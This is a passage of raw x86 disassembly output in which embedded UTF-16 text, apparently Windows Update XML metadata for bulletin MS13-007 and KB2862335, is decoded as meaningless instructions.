  40a6ca:	00 67 00             	add    %ah,0x0(%edi)
  40a6cd:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6ce:	00 73 00             	add    %dh,0x0(%ebx)
  40a6d1:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a6d5:	75 00                	jne    0x40a6d7
  40a6d7:	72 00                	jb     0x40a6d9
  40a6d9:	65 00 2e             	add    %ch,%gs:(%esi)
  40a6dc:	00 6e 00             	add    %ch,0x0(%esi)
  40a6df:	65 00 74 00 26       	add    %dh,%gs:0x26(%eax,%eax,1)
  40a6e4:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  40a6e8:	00 3b                	add    %bh,(%ebx)
  40a6ea:	00 2f                	add    %ch,(%edi)
  40a6ec:	00 53 00             	add    %dl,0x0(%ebx)
  40a6ef:	75 00                	jne    0x40a6f1
  40a6f1:	70 00                	jo     0x40a6f3
  40a6f3:	70 00                	jo     0x40a6f5
  40a6f5:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6f6:	00 72 00             	add    %dh,0x0(%edx)
  40a6f9:	74 00                	je     0x40a6fb
  40a6fb:	55                   	push   %ebp
  40a6fc:	00 72 00             	add    %dh,0x0(%edx)
  40a6ff:	6c                   	insb   (%dx),%es:(%edi)
  40a700:	00 26                	add    %ah,(%esi)
  40a702:	00 67 00             	add    %ah,0x0(%edi)
  40a705:	74 00                	je     0x40a707
  40a707:	3b 00                	cmp    (%eax),%eax
  40a709:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40a70e:	00 3b                	add    %bh,(%ebx)
  40a710:	00 53 00             	add    %dl,0x0(%ebx)
  40a713:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a717:	75 00                	jne    0x40a719
  40a719:	72 00                	jb     0x40a71b
  40a71b:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40a721:	42                   	inc    %edx
  40a722:	00 75 00             	add    %dh,0x0(%ebp)
  40a725:	6c                   	insb   (%dx),%es:(%edi)
  40a726:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40a72a:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40a72e:	00 6e 00             	add    %ch,0x0(%esi)
  40a731:	49                   	dec    %ecx
  40a732:	00 44 00 26          	add    %al,0x26(%eax,%eax,1)
  40a736:	00 67 00             	add    %ah,0x0(%edi)
  40a739:	74 00                	je     0x40a73b
  40a73b:	3b 00                	cmp    (%eax),%eax
  40a73d:	4d                   	dec    %ebp
  40a73e:	00 53 00             	add    %dl,0x0(%ebx)
  40a741:	34 00                	xor    $0x0,%al
  40a743:	32 00                	xor    (%eax),%al
  40a745:	2d 00 30 00 30       	sub    $0x30003000,%eax
  40a74a:	00 37                	add    %dh,(%edi)
  40a74c:	00 26                	add    %ah,(%esi)
  40a74e:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  40a752:	00 3b                	add    %bh,(%ebx)
  40a754:	00 2f                	add    %ch,(%edi)
  40a756:	00 53 00             	add    %dl,0x0(%ebx)
  40a759:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a75d:	75 00                	jne    0x40a75f
  40a75f:	72 00                	jb     0x40a761
  40a761:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40a767:	42                   	inc    %edx
  40a768:	00 75 00             	add    %dh,0x0(%ebp)
  40a76b:	6c                   	insb   (%dx),%es:(%edi)
  40a76c:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40a770:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40a774:	00 6e 00             	add    %ch,0x0(%esi)
  40a777:	49                   	dec    %ecx
  40a778:	00 44 00 26          	add    %al,0x26(%eax,%eax,1)
  40a77c:	00 67 00             	add    %ah,0x0(%edi)
  40a77f:	74 00                	je     0x40a781
  40a781:	3b 00                	cmp    (%eax),%eax
  40a783:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40a788:	00 3b                	add    %bh,(%ebx)
  40a78a:	00 4b 00             	add    %cl,0x0(%ebx)
  40a78d:	42                   	inc    %edx
  40a78e:	00 41 00             	add    %al,0x0(%ecx)
  40a791:	72 00                	jb     0x40a793
  40a793:	74 00                	je     0x40a795
  40a795:	69 00 63 00 6c 00    	imul   $0x6c0063,(%eax),%eax
  40a79b:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40a79f:	44                   	inc    %esp
  40a7a0:	00 26                	add    %ah,(%esi)
  40a7a2:	00 67 00             	add    %ah,0x0(%edi)
  40a7a5:	74 00                	je     0x40a7a7
  40a7a7:	3b 00                	cmp    (%eax),%eax
  40a7a9:	32 00                	xor    (%eax),%al
  40a7ab:	38 00                	cmp    %al,(%eax)
  40a7ad:	36 00 32             	add    %dh,%ss:(%edx)
  40a7b0:	00 33                	add    %dh,(%ebx)
  40a7b2:	00 33                	add    %dh,(%ebx)
  40a7b4:	00 35 00 26 00 6c    	add    %dh,0x6c002600
  40a7ba:	00 74 00 3b          	add    %dh,0x3b(%eax,%eax,1)
  40a7be:	00 2f                	add    %ch,(%edi)
  40a7c0:	00 4b 00             	add    %cl,0x0(%ebx)
  40a7c3:	42                   	inc    %edx
  40a7c4:	00 41 00             	add    %al,0x0(%ecx)
  40a7c7:	72 00                	jb     0x40a7c9
  40a7c9:	74 00                	je     0x40a7cb
  40a7cb:	69 00 63 00 6c 00    	imul   $0x6c0063,(%eax),%eax
  40a7d1:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40a7d5:	44                   	inc    %esp
  40a7d6:	00 26                	add    %ah,(%esi)
  40a7d8:	00 67 00             	add    %ah,0x0(%edi)
  40a7db:	74 00                	je     0x40a7dd
  40a7dd:	3b 00                	cmp    (%eax),%eax
  40a7df:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40a7e4:	00 3b                	add    %bh,(%ebx)
  40a7e6:	00 2f                	add    %ch,(%edi)
  40a7e8:	00 45 00             	add    %al,0x0(%ebp)
  40a7eb:	78 00                	js     0x40a7ed
  40a7ed:	74 00                	je     0x40a7ef
  40a7ef:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40a7f3:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40a7f7:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  40a7fb:	72 00                	jb     0x40a7fd
  40a7fd:	6f                   	outsl  %ds:(%esi),(%dx)
  40a7fe:	00 70 00             	add    %dh,0x0(%eax)
  40a801:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a805:	74 00                	je     0x40a807
  40a807:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  40a80d:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40a811:	74 00                	je     0x40a813
  40a813:	3b 00                	cmp    (%eax),%eax
  40a815:	3c 00                	cmp    $0x0,%al
  40a817:	2f                   	das
  40a818:	00 58 00             	add    %bl,0x0(%eax)
  40a81b:	6d                   	insl   (%dx),%es:(%edi)
  40a81c:	00 6c 00 3e          	add    %ch,0x3e(%eax,%eax,1)
  40a820:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40a826:	00 20                	add    %ah,(%eax)
  40a828:	00 20                	add    %ah,(%eax)
  40a82a:	00 20                	add    %ah,(%eax)
  40a82c:	00 20                	add    %ah,(%eax)
  40a82e:	00 20                	add    %ah,(%eax)
  40a830:	00 20                	add    %ah,(%eax)
  40a832:	00 20                	add    %ah,(%eax)
  40a834:	00 20                	add    %ah,(%eax)
  40a836:	00 20                	add    %ah,(%eax)
  40a838:	00 20                	add    %ah,(%eax)
  40a83a:	00 20                	add    %ah,(%eax)
  40a83c:	00 20                	add    %ah,(%eax)
  40a83e:	00 20                	add    %ah,(%eax)
  40a840:	00 20                	add    %ah,(%eax)
  40a842:	00 20                	add    %ah,(%eax)
  40a844:	00 20                	add    %ah,(%eax)
  40a846:	00 20                	add    %ah,(%eax)
  40a848:	00 20                	add    %ah,(%eax)
  40a84a:	00 20                	add    %ah,(%eax)
  40a84c:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40a84f:	2f                   	das
  40a850:	00 55 00             	add    %dl,0x0(%ebp)
  40a853:	70 00                	jo     0x40a855
  40a855:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40a859:	74 00                	je     0x40a85b
  40a85b:	65 00 3e             	add    %bh,%gs:(%esi)
  40a85e:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40a864:	00 20                	add    %ah,(%eax)
  40a866:	00 20                	add    %ah,(%eax)
  40a868:	00 20                	add    %ah,(%eax)
  40a86a:	00 20                	add    %ah,(%eax)
  40a86c:	00 20                	add    %ah,(%eax)
  40a86e:	00 20                	add    %ah,(%eax)
  40a870:	00 20                	add    %ah,(%eax)
  40a872:	00 20                	add    %ah,(%eax)
  40a874:	00 20                	add    %ah,(%eax)
  40a876:	00 20                	add    %ah,(%eax)
  40a878:	00 20                	add    %ah,(%eax)
  40a87a:	00 20                	add    %ah,(%eax)
  40a87c:	00 20                	add    %ah,(%eax)
  40a87e:	00 20                	add    %ah,(%eax)
  40a880:	00 20                	add    %ah,(%eax)
  40a882:	00 20                	add    %ah,(%eax)
  40a884:	00 20                	add    %ah,(%eax)
  40a886:	00 20                	add    %ah,(%eax)
  40a888:	00 20                	add    %ah,(%eax)
  40a88a:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40a88d:	55                   	push   %ebp
  40a88e:	00 70 00             	add    %dh,0x0(%eax)
  40a891:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40a895:	74 00                	je     0x40a897
  40a897:	65 00 3e             	add    %bh,%gs:(%esi)
  40a89a:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40a8a0:	00 20                	add    %ah,(%eax)
  40a8a2:	00 20                	add    %ah,(%eax)
  40a8a4:	00 20                	add    %ah,(%eax)
  40a8a6:	00 20                	add    %ah,(%eax)
  40a8a8:	00 20                	add    %ah,(%eax)
  40a8aa:	00 20                	add    %ah,(%eax)
  40a8ac:	00 20                	add    %ah,(%eax)
  40a8ae:	00 20                	add    %ah,(%eax)
  40a8b0:	00 20                	add    %ah,(%eax)
  40a8b2:	00 20                	add    %ah,(%eax)
  40a8b4:	00 20                	add    %ah,(%eax)
  40a8b6:	00 20                	add    %ah,(%eax)
  40a8b8:	00 20                	add    %ah,(%eax)
  40a8ba:	00 20                	add    %ah,(%eax)
  40a8bc:	00 20                	add    %ah,(%eax)
  40a8be:	00 20                	add    %ah,(%eax)
  40a8c0:	00 20                	add    %ah,(%eax)
  40a8c2:	00 20                	add    %ah,(%eax)
  40a8c4:	00 20                	add    %ah,(%eax)
  40a8c6:	00 20                	add    %ah,(%eax)
  40a8c8:	00 20                	add    %ah,(%eax)
  40a8ca:	00 20                	add    %ah,(%eax)
  40a8cc:	00 20                	add    %ah,(%eax)
  40a8ce:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40a8d1:	49                   	dec    %ecx
  40a8d2:	00 44 00 3e          	add    %al,0x3e(%eax,%eax,1)
  40a8d6:	00 7b 00             	add    %bh,0x0(%ebx)
  40a8d9:	31 00                	xor    %eax,(%eax)
  40a8db:	30 00                	xor    %al,(%eax)
  40a8dd:	7d 00                	jge    0x40a8df
  40a8df:	3c 00                	cmp    $0x0,%al
  40a8e1:	2f                   	das
  40a8e2:	00 49 00             	add    %cl,0x0(%ecx)
  40a8e5:	44                   	inc    %esp
  40a8e6:	00 3e                	add    %bh,(%esi)
  40a8e8:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40a8ee:	00 20                	add    %ah,(%eax)
  40a8f0:	00 20                	add    %ah,(%eax)
  40a8f2:	00 20                	add    %ah,(%eax)
  40a8f4:	00 20                	add    %ah,(%eax)
  40a8f6:	00 20                	add    %ah,(%eax)
  40a8f8:	00 20                	add    %ah,(%eax)
  40a8fa:	00 20                	add    %ah,(%eax)
  40a8fc:	00 20                	add    %ah,(%eax)
  40a8fe:	00 20                	add    %ah,(%eax)
  40a900:	00 20                	add    %ah,(%eax)
  40a902:	00 20                	add    %ah,(%eax)
  40a904:	00 20                	add    %ah,(%eax)
  40a906:	00 20                	add    %ah,(%eax)
  40a908:	00 20                	add    %ah,(%eax)
  40a90a:	00 20                	add    %ah,(%eax)
  40a90c:	00 20                	add    %ah,(%eax)
  40a90e:	00 20                	add    %ah,(%eax)
  40a910:	00 20                	add    %ah,(%eax)
  40a912:	00 20                	add    %ah,(%eax)
  40a914:	00 20                	add    %ah,(%eax)
  40a916:	00 20                	add    %ah,(%eax)
  40a918:	00 20                	add    %ah,(%eax)
  40a91a:	00 20                	add    %ah,(%eax)
  40a91c:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40a91f:	58                   	pop    %eax
  40a920:	00 6d 00             	add    %ch,0x0(%ebp)
  40a923:	6c                   	insb   (%dx),%es:(%edi)
  40a924:	00 3e                	add    %bh,(%esi)
  40a926:	00 26                	add    %ah,(%esi)
  40a928:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  40a92c:	00 3b                	add    %bh,(%ebx)
  40a92e:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40a932:	00 63 00             	add    %ah,0x0(%ebx)
  40a935:	61                   	popa
  40a936:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40a93a:	00 7a 00             	add    %bh,0x0(%edx)
  40a93d:	65 00 64 00 50       	add    %ah,%gs:0x50(%eax,%eax,1)
  40a942:	00 72 00             	add    %dh,0x0(%edx)
  40a945:	6f                   	outsl  %ds:(%esi),(%dx)
  40a946:	00 70 00             	add    %dh,0x0(%eax)
  40a949:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a94d:	74 00                	je     0x40a94f
  40a94f:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  40a955:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40a959:	74 00                	je     0x40a95b
  40a95b:	3b 00                	cmp    (%eax),%eax
  40a95d:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40a962:	00 3b                	add    %bh,(%ebx)
  40a964:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  40a968:	00 6e 00             	add    %ch,0x0(%esi)
  40a96b:	67 00 75 00          	add    %dh,0x0(%di)
  40a96f:	61                   	popa
  40a970:	00 67 00             	add    %ah,0x0(%edi)
  40a973:	65 00 26             	add    %ah,%gs:(%esi)
  40a976:	00 67 00             	add    %ah,0x0(%edi)
  40a979:	74 00                	je     0x40a97b
  40a97b:	3b 00                	cmp    (%eax),%eax
  40a97d:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40a981:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40a986:	00 3b                	add    %bh,(%ebx)
  40a988:	00 2f                	add    %ch,(%edi)
  40a98a:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  40a98e:	00 6e 00             	add    %ch,0x0(%esi)
  40a991:	67 00 75 00          	add    %dh,0x0(%di)
  40a995:	61                   	popa
  40a996:	00 67 00             	add    %ah,0x0(%edi)
  40a999:	65 00 26             	add    %ah,%gs:(%esi)
  40a99c:	00 67 00             	add    %ah,0x0(%edi)
  40a99f:	74 00                	je     0x40a9a1
  40a9a1:	3b 00                	cmp    (%eax),%eax
  40a9a3:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40a9a8:	00 3b                	add    %bh,(%ebx)
  40a9aa:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  40a9ae:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  40a9b2:	00 65 00             	add    %ah,0x0(%ebp)
  40a9b5:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40a9b9:	74 00                	je     0x40a9bb
  40a9bb:	3b 00                	cmp    (%eax),%eax
  40a9bd:	42                   	inc    %edx
  40a9be:	00 75 00             	add    %dh,0x0(%ebp)
  40a9c1:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9c2:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40a9c6:	00 65 00             	add    %ah,0x0(%ebp)
  40a9c9:	20 00                	and    %al,(%eax)
  40a9cb:	53                   	push   %ebx
  40a9cc:	00 65 00             	add    %ah,0x0(%ebp)
  40a9cf:	63 00                	arpl   %eax,(%eax)
  40a9d1:	75 00                	jne    0x40a9d3
  40a9d3:	72 00                	jb     0x40a9d5
  40a9d5:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40a9db:	20 00                	and    %al,(%eax)
  40a9dd:	55                   	push   %ebp
  40a9de:	00 70 00             	add    %dh,0x0(%eax)
  40a9e1:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40a9e5:	74 00                	je     0x40a9e7
  40a9e7:	65 00 20             	add    %ah,%gs:(%eax)
  40a9ea:	00 66 00             	add    %ah,0x0(%esi)
  40a9ed:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9ee:	00 72 00             	add    %dh,0x0(%edx)
  40a9f1:	20 00                	and    %al,(%eax)
  40a9f3:	2a 00                	sub    (%eax),%al
  40a9f5:	20 00                	and    %al,(%eax)
  40a9f7:	57                   	push   %edi
  40a9f8:	00 69 00             	add    %ch,0x0(%ecx)
  40a9fb:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9fc:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  40aa00:	00 77 00             	add    %dh,0x0(%edi)
  40aa03:	73 00                	jae    0x40aa05
  40aa05:	20 00                	and    %al,(%eax)
  40aa07:	28 00                	sub    %al,(%eax)
  40aa09:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40aa0d:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa0e:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa11:	20 00                	and    %al,(%eax)
  40aa13:	4b                   	dec    %ebx
  40aa14:	00 42 00             	add    %al,0x0(%edx)
  40aa17:	32 00                	xor    (%eax),%al
  40aa19:	38 00                	cmp    %al,(%eax)
  40aa1b:	36 00 32             	add    %dh,%ss:(%edx)
  40aa1e:	00 33                	add    %dh,(%ebx)
  40aa20:	00 33                	add    %dh,(%ebx)
  40aa22:	00 35 00 29 00 26    	add    %dh,0x26002900
  40aa28:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  40aa2c:	00 3b                	add    %bh,(%ebx)
  40aa2e:	00 2f                	add    %ch,(%edi)
  40aa30:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  40aa34:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  40aa38:	00 65 00             	add    %ah,0x0(%ebp)
  40aa3b:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40aa3f:	74 00                	je     0x40aa41
  40aa41:	3b 00                	cmp    (%eax),%eax
  40aa43:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40aa48:	00 3b                	add    %bh,(%ebx)
  40aa4a:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  40aa4e:	00 73 00             	add    %dh,0x0(%ebx)
  40aa51:	63 00                	arpl   %eax,(%eax)
  40aa53:	72 00                	jb     0x40aa55
  40aa55:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40aa5b:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40aa61:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40aa65:	74 00                	je     0x40aa67
  40aa67:	3b 00                	cmp    (%eax),%eax
  40aa69:	41                   	inc    %ecx
  40aa6a:	00 20                	add    %ah,(%eax)
  40aa6c:	00 73 00             	add    %dh,0x0(%ebx)
  40aa6f:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40aa73:	75 00                	jne    0x40aa75
  40aa75:	72 00                	jb     0x40aa77
  40aa77:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40aa7d:	20 00                	and    %al,(%eax)
  40aa7f:	69 00 73 00 73 00    	imul   $0x730073,(%eax),%eax
  40aa85:	75 00                	jne    0x40aa87
  40aa87:	65 00 20             	add    %ah,%gs:(%eax)
  40aa8a:	00 68 00             	add    %ch,0x0(%eax)
  40aa8d:	61                   	popa
  40aa8e:	00 73 00             	add    %dh,0x0(%ebx)
  40aa91:	20 00                	and    %al,(%eax)
  40aa93:	62 00                	bound  %eax,(%eax)
  40aa95:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  40aa99:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa9a:	00 20                	add    %ah,(%eax)
  40aa9c:	00 69 00             	add    %ch,0x0(%ecx)
  40aa9f:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40aaa3:	6e                   	outsb  %ds:(%esi),(%dx)
  40aaa4:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40aaa8:	00 66 00             	add    %ah,0x0(%esi)
  40aaab:	69 00 65 00 64 00    	imul   $0x640065,(%eax),%eax
  40aab1:	20 00                	and    %al,(%eax)
  40aab3:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  40aab9:	61                   	popa
  40aaba:	00 20                	add    %ah,(%eax)
  40aabc:	00 4d 00             	add    %cl,0x0(%ebp)
  40aabf:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  40aac5:	6f                   	outsl  %ds:(%esi),(%dx)
  40aac6:	00 73 00             	add    %dh,0x0(%ebx)
  40aac9:	6f                   	outsl  %ds:(%esi),(%dx)
  40aaca:	00 66 00             	add    %ah,0x0(%esi)
  40aacd:	74 00                	je     0x40aacf
  40aacf:	20 00                	and    %al,(%eax)
  40aad1:	73 00                	jae    0x40aad3
  40aad3:	6f                   	outsl  %ds:(%esi),(%dx)
  40aad4:	00 66 00             	add    %ah,0x0(%esi)
  40aad7:	74 00                	je     0x40aad9
  40aad9:	77 00                	ja     0x40aadb
  40aadb:	61                   	popa
  40aadc:	00 72 00             	add    %dh,0x0(%edx)
  40aadf:	65 00 20             	add    %ah,%gs:(%eax)
  40aae2:	00 70 00             	add    %dh,0x0(%eax)
  40aae5:	72 00                	jb     0x40aae7
  40aae7:	6f                   	outsl  %ds:(%esi),(%dx)
  40aae8:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40aaec:	00 63 00             	add    %ah,0x0(%ebx)
  40aaef:	74 00                	je     0x40aaf1
  40aaf1:	20 00                	and    %al,(%eax)
  40aaf3:	74 00                	je     0x40aaf5
  40aaf5:	68 00 61 00 74       	push   $0x74006100
  40aafa:	00 20                	add    %ah,(%eax)
  40aafc:	00 63 00             	add    %ah,0x0(%ebx)
  40aaff:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab00:	00 75 00             	add    %dh,0x0(%ebp)
  40ab03:	6c                   	insb   (%dx),%es:(%edi)
  40ab04:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40ab08:	00 61 00             	add    %ah,0x0(%ecx)
  40ab0b:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40ab0f:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40ab13:	74 00                	je     0x40ab15
  40ab15:	20 00                	and    %al,(%eax)
  40ab17:	79 00                	jns    0x40ab19
  40ab19:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab1a:	00 75 00             	add    %dh,0x0(%ebp)
  40ab1d:	72 00                	jb     0x40ab1f
  40ab1f:	20 00                	and    %al,(%eax)
  40ab21:	73 00                	jae    0x40ab23
  40ab23:	79 00                	jns    0x40ab25
  40ab25:	73 00                	jae    0x40ab27
  40ab27:	74 00                	je     0x40ab29
  40ab29:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40ab2d:	2e 00 20             	add    %ah,%cs:(%eax)
  40ab30:	00 59 00             	add    %bl,0x0(%ecx)
  40ab33:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab34:	00 75 00             	add    %dh,0x0(%ebp)
  40ab37:	20 00                	and    %al,(%eax)
  40ab39:	63 00                	arpl   %eax,(%eax)
  40ab3b:	61                   	popa
  40ab3c:	00 6e 00             	add    %ch,0x0(%esi)
  40ab3f:	20 00                	and    %al,(%eax)
  40ab41:	68 00 65 00 6c       	push   $0x6c006500
  40ab46:	00 70 00             	add    %dh,0x0(%eax)
  40ab49:	20 00                	and    %al,(%eax)
  40ab4b:	70 00                	jo     0x40ab4d
  40ab4d:	72 00                	jb     0x40ab4f
  40ab4f:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab50:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40ab54:	00 63 00             	add    %ah,0x0(%ebx)
  40ab57:	74 00                	je     0x40ab59
  40ab59:	20 00                	and    %al,(%eax)
  40ab5b:	79 00                	jns    0x40ab5d
  40ab5d:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab5e:	00 75 00             	add    %dh,0x0(%ebp)
  40ab61:	72 00                	jb     0x40ab63
  40ab63:	20 00                	and    %al,(%eax)
  40ab65:	73 00                	jae    0x40ab67
  40ab67:	79 00                	jns    0x40ab69
  40ab69:	73 00                	jae    0x40ab6b
  40ab6b:	74 00                	je     0x40ab6d
  40ab6d:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40ab71:	20 00                	and    %al,(%eax)
  40ab73:	62 00                	bound  %eax,(%eax)
  40ab75:	79 00                	jns    0x40ab77
  40ab77:	20 00                	and    %al,(%eax)
  40ab79:	69 00 6e 00 73 00    	imul   $0x73006e,(%eax),%eax
  40ab7f:	74 00                	je     0x40ab81
  40ab81:	61                   	popa
  40ab82:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40ab86:	00 69 00             	add    %ch,0x0(%ecx)
  40ab89:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab8a:	00 67 00             	add    %ah,0x0(%edi)
  40ab8d:	20 00                	and    %al,(%eax)
  40ab8f:	74 00                	je     0x40ab91
  40ab91:	68 00 69 00 73       	push   $0x73006900
  40ab96:	00 20                	add    %ah,(%eax)
  40ab98:	00 75 00             	add    %dh,0x0(%ebp)
  40ab9b:	70 00                	jo     0x40ab9d
  40ab9d:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40aba1:	74 00                	je     0x40aba3
  40aba3:	65 00 20             	add    %ah,%gs:(%eax)
  40aba6:	00 66 00             	add    %ah,0x0(%esi)
  40aba9:	72 00                	jb     0x40abab
  40abab:	6f                   	outsl  %ds:(%esi),(%dx)
  40abac:	00 6d 00             	add    %ch,0x0(%ebp)
  40abaf:	20 00                	and    %al,(%eax)
  40abb1:	4d                   	dec    %ebp
  40abb2:	00 69 00             	add    %ch,0x0(%ecx)
  40abb5:	63 00                	arpl   %eax,(%eax)
  40abb7:	72 00                	jb     0x40abb9
  40abb9:	6f                   	outsl  %ds:(%esi),(%dx)
  40abba:	00 73 00             	add    %dh,0x0(%ebx)
  40abbd:	6f                   	outsl  %ds:(%esi),(%dx)
  40abbe:	00 66 00             	add    %ah,0x0(%esi)
  40abc1:	74 00                	je     0x40abc3
  40abc3:	2e 00 20             	add    %ah,%cs:(%eax)
  40abc6:	00 46 00             	add    %al,0x0(%esi)
  40abc9:	6f                   	outsl  %ds:(%esi),(%dx)
  40abca:	00 72 00             	add    %dh,0x0(%edx)
  40abcd:	20 00                	and    %al,(%eax)
  40abcf:	61                   	popa
  40abd0:	00 20                	add    %ah,(%eax)
  40abd2:	00 63 00             	add    %ah,0x0(%ebx)
  40abd5:	6f                   	outsl  %ds:(%esi),(%dx)
  40abd6:	00 6d 00             	add    %ch,0x0(%ebp)
  40abd9:	70 00                	jo     0x40abdb
  40abdb:	6c                   	insb   (%dx),%es:(%edi)
  40abdc:	00 65 00             	add    %ah,0x0(%ebp)
  40abdf:	74 00                	je     0x40abe1
  40abe1:	65 00 20             	add    %ah,%gs:(%eax)
  40abe4:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40abe8:	00 73 00             	add    %dh,0x0(%ebx)
  40abeb:	74 00                	je     0x40abed
  40abed:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40abf3:	20 00                	and    %al,(%eax)
  40abf5:	6f                   	outsl  %ds:(%esi),(%dx)
  40abf6:	00 66 00             	add    %ah,0x0(%esi)
  40abf9:	20 00                	and    %al,(%eax)
  40abfb:	74 00                	je     0x40abfd
  40abfd:	68 00 65 00 20       	push   $0x20006500
  40ac02:	00 69 00             	add    %ch,0x0(%ecx)
  40ac05:	73 00                	jae    0x40ac07
  40ac07:	73 00                	jae    0x40ac09
  40ac09:	75 00                	jne    0x40ac0b
  40ac0b:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40ac0f:	20 00                	and    %al,(%eax)
  40ac11:	74 00                	je     0x40ac13
  40ac13:	68 00 61 00 74       	push   $0x74006100
  40ac18:	00 20                	add    %ah,(%eax)
  40ac1a:	00 61 00             	add    %ah,0x0(%ecx)
  40ac1d:	72 00                	jb     0x40ac1f
  40ac1f:	65 00 20             	add    %ah,%gs:(%eax)
  40ac22:	00 69 00             	add    %ch,0x0(%ecx)
  40ac25:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac26:	00 63 00             	add    %ah,0x0(%ebx)
  40ac29:	6c                   	insb   (%dx),%es:(%edi)
  40ac2a:	00 75 00             	add    %dh,0x0(%ebp)
  40ac2d:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40ac31:	64 00 20             	add    %ah,%fs:(%eax)
  40ac34:	00 69 00             	add    %ch,0x0(%ecx)
  40ac37:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac38:	00 20                	add    %ah,(%eax)
  40ac3a:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40ac3e:	00 69 00             	add    %ch,0x0(%ecx)
